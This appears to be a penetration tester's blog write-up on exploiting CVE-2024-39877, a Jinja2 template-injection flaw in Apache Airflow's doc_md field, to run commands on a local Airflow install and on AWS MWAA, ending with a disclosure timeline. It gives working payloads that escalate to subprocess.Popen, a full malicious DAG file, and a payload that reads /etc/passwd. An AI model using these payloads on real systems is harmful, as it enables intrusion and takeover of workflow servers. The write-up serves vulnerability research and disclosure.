# AWS MWAA - RCE

Amazon Managed Workflows for Apache Airflow (MWAA) is a managed service to run Apache Airflow on AWS without managing infrastructure. However, most installations are affected by CVE-2024-39877, an SSTI vulnerability which allows remote code execution.

<br>


## Local testing

After finding the Apache Airflow used by the AWS MWAA instance was 2.9.2, I decided to find possible attacks for this version and test them first locally.

CVE-2024-39877 is a vulnerability affecting Apache Airflow versions 2.4.0 to 2.9.2, included. It allows authenticated users with DAG editing permissions to inject malicious Jinja2 templates into the **doc_md field**, leading to RCE. 

It is perfectly explained in this [Securelayer7 blog](https://blog.securelayer7.net/arbitrary-code-execution-in-apache-airflow/), but I still needed to deep a little more in it to actually execute commands.

First, I installed the software using Docker. The Amazon MWAA instance was using the 2.9.2 version, so I used the same:

```
sudo docker pull apache/airflow:2.9.2
curl -LfO 'https://airflow.apache.org/docs/apache-airflow/2.9.2/docker-compose.yaml'
mkdir -p ./dags ./logs ./plugins ./config && echo -e "AIRFLOW_UID=$(id -u)" > .env
sudo docker-compose up airflow-init
sudo docker-compose up
```

Then, I created a new DAG file (which are actually Python files with the typical ".py" extension) and placed it in the recently created "dags" folder. This basic payload exploits the SSTI vulnerability and prints the result of the multiplication:

```
doc_md="""
{{ 3*3 }}
"""
```


![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/mwaa/Screenshot_1.png)


Next, the list of classes using the same payload from the Securelayer7 blog:

```
doc_md="""
{{ ''.__class__.__mro__[1].__subclasses__() }}
"""
```


![img2](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/mwaa/Screenshot_2.png)


This shows the SSTI attack was successful and the list of classes contains the *subprocess.Popen* class, which, as mentioned in the blog, is useful for executing commands remotely. 

To actually call this class, we need to find the index from the list of classes. I could not figure out a way to automate it inside the SSTI payload, but you can use any way or dirty code to get the correct index for your installation. 

For example, with this list:

```
[<class 'type'>, <class 'async_generator'>, <class 'subProcess.Popen'> ,...]
```

The class *subProcess.Popen* is the third element, but in Python the first element has the index 0, so the index for the class is actually 2.

In my case it is the index number 309, so I will first print the name of the class to make sure it is "Popen":

```
doc_md="""
{{ ''.__class__.__mro__[1].__subclasses__()[309].__name__ }}
"""
```


![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/mwaa/Screenshot_3.png)


If the class name from the previous step is correct, the index is the correct one so it is possible to execute commands like this:

```
doc_md="""
{{ ''.__class__.__mro__[1].__subclasses__()[309]('id', shell=True, stdout=-1).communicate() }}
"""
```


![img4](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/mwaa/Screenshot_4.png)


A complete malicious DAG file could look like this:

```
from datetime import datetime, timedelta
from airflow import DAG
from airflow.operators.python import PythonOperator

def say_hello():
    print("Hello World from Airflow!")

default_args = {
    'owner': 'airflow',
    'retries': 1,
    'retry_delay': timedelta(minutes=1),
}

with DAG(
    dag_id='test_3',
    default_args=default_args,
    description='Un DAG cualquiera',
    schedule_interval='@daily',
    start_date=datetime(2025, 5, 7),
    catchup=False,
    tags=['ejemplo'],
    doc_md="""
    # Test 3
    ### Class Name
    {{ ''.__class__.__mro__[1].__subclasses__()[309].__name__ }}
    ### Command Output
    {{ ''.__class__.__mro__[1].__subclasses__()[309]('id', shell=True, stdout=-1).communicate() }}
    """
) as dag:
    tarea_1 = PythonOperator(
        task_id='di_hola',
        python_callable=say_hello,
    )
```

<br>

--------------------------

## Amazon MWAA testing

At the moment of writing this post, Amazon allows to set up the Apache Airflow using the versions v2.10.3, v2.10.1, v2.9.2, v2.8.1, v2.7.2, v2.6.3, v2.5.1, v2.4.3 as you can see in this link: [https://docs.aws.amazon.com/mwaa/latest/userguide/create-environment.html#create-environment-regions-aa-versions](https://docs.aws.amazon.com/mwaa/latest/userguide/create-environment.html#create-environment-regions-aa-versions).

![img9](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/mwaa/Screenshot_9.png)

**Update from July 2025**: Now the versions 2.4.3, 2.5.1 and 2.6.3 are not available anymore.

However, all these versions except v2.10.3 and v2.10.1 are vulnerable to CVE-2024-39877, the SSTI exploit I used to get remote command execution locally, as you can check in the NIST page: [https://nvd.nist.gov/vuln/detail/cve-2024-39877](https://nvd.nist.gov/vuln/detail/cve-2024-39877).

The only difference in this case is that the DAG files are not uploaded to a "dags" folder in the filesystem, but instead to an S3 bucket. So in order to compromise this Amazon service, the prerequisites are:

- The Apache Airflow version must be 2.9.2 or below.

- You need to be authenticated to the Apache Airflow web panel.

- You need to have permissions to write the DAG files to the S3 bucket.

For me, this was easy to obtain as this was a penetration test and not a Red Team assessment, so I could ask the affected team to upload the necessary files. If this had been an Apache Airflow installation and not the Amazon service, I would have been in a similar situation because I would have needed to upload the DAG files to the filesystem anyway.

To test the MWAA service, I sent 3 files containing different payloads:

- File 1: With a very simple payload ({{ 3\*3 }}).
- File 2: With the code to list the available classes.
- File 3: With the code to execute "cat /etc/passwd" assumming the index was 309.

First one... Success!

![img5](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/mwaa/Screenshot_5.jpg)

Second one... Success!

![img6](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/mwaa/Screenshot_6.jpg)

Third one... Not success

![img7](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/mwaa/Screenshot_7.jpg)


This was expected, because the classes order (the one we get when uploading the second file) is different for each instance of Apache Airflow I have tested. So it is time to read the output from the second DAG file again, find the correct index of the *subprocess.Popen* class, reupload the third file with the updated index and...

![img8](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/refs/heads/master/images/mwaa/Screenshot_8.jpg)

... Success! RCE in Amazon MWAA :)

<br>


--------------------------

## Responsible Disclosure Timeline

24-6-25 - Reported to AWS VDP

26-6-25 - RCE confirmed 




<br>

--------------------------

## Sources

- [Securelayer7 blog](https://blog.securelayer7.net/arbitrary-code-execution-in-apache-airflow/)

<br>
